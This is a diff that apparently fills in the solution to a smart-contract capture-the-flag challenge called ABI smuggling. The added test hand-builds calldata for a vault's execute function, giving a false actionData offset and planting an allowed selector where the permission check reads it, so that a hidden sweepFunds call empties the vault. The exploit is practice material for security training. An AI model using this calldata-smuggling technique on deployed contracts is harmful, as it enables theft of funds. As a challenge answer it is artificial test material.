@@ -73,7 +73,30 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        bytes memory sweepData = abi.encodeCall(
+            vault.sweepFunds,
+            (recovery, IERC20(address(token)))
+        );
+    
+        bytes memory smuggledCalldata = abi.encodePacked(
+            vault.execute.selector,
+    
+            // execute(address target, bytes actionData)
+            bytes32(uint256(uint160(address(vault)))), // target
+            bytes32(uint256(0x80)),                    // real actionData offset
+    
+            // fake area read by manual assembly
+            bytes32(0),                                // padding: 0x44 -> 0x63
+            bytes4(0xd9caed12),                       // allowed selector read at 0x64
+            bytes28(0),                               // padding
+    
+            // real actionData starts at offset 0x80
+            bytes32(sweepData.length),
+            sweepData
+        );
+    
+        (bool ok,) = address(vault).call(smuggledCalldata);
+        require(ok, "smuggle failed");
     }
 
     /**
